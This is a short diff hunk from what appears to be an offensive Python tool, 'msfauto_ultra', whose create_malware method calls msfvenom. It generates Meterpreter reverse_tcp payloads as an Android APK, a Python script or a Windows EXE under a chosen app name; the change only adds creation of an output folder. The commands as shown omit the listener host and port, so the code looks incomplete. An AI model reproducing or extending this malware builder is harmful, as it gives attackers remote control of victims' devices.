@@ -11,6 +11,7 @@ class msfauto_ultra():
         self.port2 = port_two
         self.payload = payload
     def create_malware(self): 
+        create_output_folder()
         if self.payload.lower() == "android": os.system(f"msfvenom -p android/meterpreter/reverse_tcp -f apk > /Output/{self.app_name}.apk")
         elif self.payload == "mac": os.system(f"msfvenom -p python/meterpreter/reverse_tcp > /Output/{self.app_name}.py")
         else: os.system(f"msfvenom -p windows/meterpreter/reverse_tcp -f exe > /Output/{self.app_name}.exe")
